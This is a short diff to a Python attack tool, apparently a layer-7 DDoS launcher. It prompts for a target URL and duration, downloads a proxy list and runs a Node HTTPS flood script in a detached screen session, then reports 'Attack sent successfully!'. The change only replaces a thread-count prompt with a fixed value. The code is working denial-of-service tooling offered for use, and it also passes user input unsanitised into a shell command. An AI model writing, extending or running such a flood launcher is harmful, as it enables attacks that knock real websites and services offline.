@@ -599,11 +599,10 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread(1 or 2): "+Color.RESET))
 					F_Tool.styleText("\n [*] Downloading Proxy...\n")
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
